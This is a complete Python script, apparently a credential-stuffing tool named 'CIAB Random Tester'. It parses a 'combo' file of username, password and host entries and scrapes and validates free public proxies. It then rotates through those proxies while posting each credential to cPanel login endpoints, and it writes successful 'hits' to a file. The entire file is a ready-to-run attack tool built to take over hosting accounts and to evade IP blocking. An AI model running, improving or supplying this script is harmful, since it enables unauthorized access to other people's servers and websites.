#!/usr/bin/env python3
"""
CIAB Random Tester + Auto Proxy (ALL-IN-ONE)
Scrapes ~1000+ working proxies from ProxyScrape, Proxifly, spys.me
Validates them, rotates through them while checking cPanel logins.
Original cPanel checking code untouched - just proxy bolted on.

Usage:
  python cpanel_proxy.py creds.txt
"""
import sys, os, re, time, threading, random
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
requests.packages.urllib3.disable_warnings()

# ======================== PROXY SCRAPER ========================

PROXY_SOURCES = {
    'proxyscrape_http': {
        'url': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http',
        'type': 'protocol_format'},
    'proxyscrape_socks4': {
        'url': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks4',
        'type': 'protocol_format'},
    'proxyscrape_socks5': {
        'url': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5',
        'type': 'protocol_format'},
    'proxifly_all': {
        'url': 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt',
        'type': 'protocol_format'},
    'spys_me': {
        'url': 'http://spys.me/proxy.txt',
        'type': 'spys'},
}

def parse_proxy_line(line, source_type):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    if source_type == 'protocol_format':
        m = re.match(r'^(https?|socks4|socks5)://([0-9.]+):(\d+)', line)
        if m:
            proto = m.group(1)
            if proto in ('http','https'):
                return ('http', m.group(2), m.group(3))
            elif proto == 'socks4':
                return ('socks4', m.group(2), m.group(3))
            elif proto == 'socks5':
                return ('socks5', m.group(2), m.group(3))
        return None
    elif source_type == 'spys':
        m = re.match(r'^([0-9.]+):(\d+)', line)
        return ('http', m.group(1), m.group(2)) if m else None
    return None

def scrape_source(name, info, timeout=15):
    proxies = []
    try:
        resp = requests.get(info['url'], headers={'User-Agent': 'Mozilla/5.0'}, timeout=timeout, verify=False)
        if resp.status_code == 200:
            for line in resp.text.split('\n'):
                p = parse_proxy_line(line, info['type'])
                if p:
                    proxies.append(p)
            print(f'  [+] {name}: {len(proxies)} proxies')
        else:
            print(f'  [?] {name}: HTTP {resp.status_code}')
    except Exception as e:
        print(f'  [?] {name}: {type(e).__name__}')
    return proxies

def scrape_all_proxies():
    print('\n[*] Scraping proxies...')
    print('-' * 50)
    all_raw = []
    with ThreadPoolExecutor(max_workers=6) as ex:
        fm = {ex.submit(scrape_source, n, i): n for n, i in PROXY_SOURCES.items()}
        for f in as_completed(fm):
            all_raw.extend(f.result())
    seen = set()
    uniq = []
    for p in all_raw:
        k = (p[0], p[1], p[2])
        if k not in seen:
            seen.add(k)
            uniq.append(p)
    print('-' * 50)
    print(f'  Total unique: {len(uniq)}')
    return uniq

def check_proxy(pinfo, test_url='https://api.ipify.org?format=json', timeout=5):
    pt, ip, port = pinfo
    if pt == 'http':
        pd = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
    elif pt == 'socks4':
        pd = {'http': f'socks4://{ip}:{port}', 'https': f'socks4://{ip}:{port}'}
    elif pt == 'socks5':
        pd = {'http': f'socks5://{ip}:{port}', 'https': f'socks5://{ip}:{port}'}
    else:
        return None
    try:
        t0 = time.time()
        r = requests.get(test_url, proxies=pd, timeout=timeout, verify=False)
        if r.status_code == 200:
            return {'type': pt, 'ip': ip, 'port': port,
                    'proxy_str': f'{pt}://{ip}:{port}',
                    'requests_dict': pd, 'latency': round(time.time()-t0, 2)}
    except:
        pass
    return None

def validate_proxies(plist, max_workers=100, max_valid=500):
    print(f'\n[*] Validating {len(plist)} proxies (5s timeout)...')
    print('-' * 50)
    working, done, lock = [], 0, threading.Lock()
    def check(p):
        nonlocal done
        r = check_proxy(p)
        with lock:
            done += 1
            if done % 100 == 0:
                print(f'  {done}/{len(plist)} ... {len(working)} working')
        return r
    with ThreadPoolExecutor(max_workers) as ex:
        for f in as_completed({ex.submit(check, p): p for p in plist}):
            if len(working) >= max_valid:
                break
            r = f.result()
            if r:
                working.append(r)
    working.sort(key=lambda x: x['latency'])
    print(f'  [+] Working: {len(working)}')
    return working

# ======================== PROXY ROTATOR ========================

class ProxyRotator:
    def __init__(self, plist):
        self.proxies = plist[:]
        self.idx = 0
        self.lock = threading.Lock()
    def get(self):
        with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.idx]
            self.idx = (self.idx + 1) % len(self.proxies)
            return p
    def remove(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)
                if self.idx >= len(self.proxies) and self.proxies:
                    self.idx = 0
    @property
    def count(self):
        return len(self.proxies)

# ======================== ORIGINAL CPANEL CODE ========================

def extract_credentials(line):
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])
    if raw.count(':') == 2 and '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(1)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]
    return None

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

def test_login(url, user, pwd, rotator=None, timeout=10):
    url = normalize_url(url)
    login_url = f"{url}/login/?login_only=1"
    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    proxies = None
    used = None
    if rotator:
        used = rotator.get()
        if used:
            proxies = used['requests_dict']
    try:
        r = requests.post(login_url, data=payload, timeout=timeout,
                          verify=False, allow_redirects=False, proxies=proxies)
        if r.status_code == 200 and ('security_token' in r.text or 'cpsess' in r.text):
            return True, url, used
        return False, None, used
    except requests.exceptions.ProxyError:
        if used and rotator:
            rotator.remove(used)
        return False, None, None
    except:
        return False, None, None

# ======================== PROXY CACHE ========================

CACHE_FILE = 'working_proxies.txt'

def load_cache():
    if not os.path.exists(CACHE_FILE):
        return None
    proxies = []
    with open(CACHE_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split('|')
            if len(parts) >= 3:
                pt, ip, port = parts[0], parts[1], parts[2]
                lat = float(parts[3]) if len(parts) > 3 else 0
                if pt == 'http':
                    rd = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
                elif pt == 'socks4':
                    rd = {'http': f'socks4://{ip}:{port}', 'https': f'socks4://{ip}:{port}'}
                elif pt == 'socks5':
                    rd = {'http': f'socks5://{ip}:{port}', 'https': f'socks5://{ip}:{port}'}
                else:
                    continue
                proxies.append({'type': pt, 'ip': ip, 'port': port,
                                'proxy_str': f'{pt}://{ip}:{port}',
                                'requests_dict': rd, 'latency': lat})
    return proxies if proxies else None

def save_cache(proxies):
    with open(CACHE_FILE, 'w', encoding='utf-8') as f:
        for p in proxies:
            f.write(f"{p['type']}|{p['ip']}|{p['port']}|{p['latency']}\n")
    print(f'  Saved {len(proxies)} proxies -> {CACHE_FILE}')

def proxy_stats(proxies):
    c = {'http': 0, 'socks4': 0, 'socks5': 0}
    for p in proxies:
        if p['type'] in c:
            c[p['type']] += 1
    print(f'  HTTP:{c["http"]} SOCKS4:{c["socks4"]} SOCKS5:{c["socks5"]}')
    if proxies:
        avg = sum(p['latency'] for p in proxies) / len(proxies)
        print(f'  Latency avg:{avg:.2f}s fast:{proxies[0]["latency"]}s slow:{proxies[-1]["latency"]}s')

# ======================== MAIN ========================

def main():
    print('=' * 70)
    print('CIAB Random Tester + Auto Proxy (ALL-IN-ONE)')
    print('Scrapes ~1000+ proxies | rotates while checking cPanel')
    print('Sources: ProxyScrape (HTTP/SOCKS4/SOCKS5), Proxifly, spys.me')
    print('=' * 70)

    # --- Credentials ---
    fname = sys.argv[1] if len(sys.argv) > 1 else ("combo.txt")
    if not os.path.exists(fname):
        print(f'[!] File not found: {fname}')
        return
    with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    combos = []
    for line in lines:
        c = extract_credentials(line)
        if c:
            combos.append(c)
    if not combos:
        print('[!] No combos extracted.')
        return
    print(f'\n[+] Extracted {len(combos)} combos')

    # --- Proxy Setup ---
    print('\n' + '=' * 70)
    print('PROXY SETUP')
    print('=' * 70)
    rotator = None
    ans = input('\nUse proxies? (Y/n): ').strip().lower()
    if ans != 'n':
        wp = load_cache()
        if wp:
            print(f'[+] Cached {len(wp)} proxies ({CACHE_FILE})')
            proxy_stats(wp)
            if input('Reuse? (Y/n): ').strip().lower() == 'n':
                wp = None
        if not wp:
            raw = scrape_all_proxies()
            if raw:
                wp = validate_proxies(raw, max_workers=100, max_valid=500)
                if wp:
                    save_cache(wp)
                    proxy_stats(wp)
                else:
                    print('[!] No working proxies')
            else:
                print('[!] No proxies scraped')
        if wp:
            rotator = ProxyRotator(wp)
            print(f'\n[+] Rotator: {rotator.count} proxies')
    else:
        print('[*] No proxies')

    # --- Check ---
    print('\n' + '=' * 70)
    print('CPANEL CHECKER')
    print('=' * 70)
    hit_file = 'hit.txt'
    open(hit_file, 'w').close()
    hits = 0

    for i, (url, user, pwd) in enumerate(combos, 1):
        plabel = ''
        if rotator:
            u = rotator.get()
            if u:
                plabel = f' [{u["proxy_str"]}]'
        print(f'[{i}/{len(combos)}] {user}@{url} ... ', end='', flush=True)
        if plabel:
            print(plabel, end='', flush=True)
        ok, nurl, used = test_login(url, user, pwd, rotator)
        if ok:
            print(' HIT')
            hits += 1
            with open(hit_file, 'a', encoding='utf-8') as f:
                pi = f' |proxy:{used["proxy_str"]}' if used else ''
                f.write(f'{user}:{pwd}@{nurl}{pi}\n')
            print('\n  ---------------')
            print(f'  Link:     {nurl}')
            print(f'  User:     {user}')
            print(f'  Pass:     {pwd}')
            if used:
                print(f'  Proxy:    {used["proxy_str"]}')
            print('  ---------------')
        else:
            print(' FAIL/DOWN')

    print(f'\n[DONE] Hit: {hits} -> {hit_file}')
    if rotator:
        print(f'       Pool left: {rotator.count}')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] Stopped')
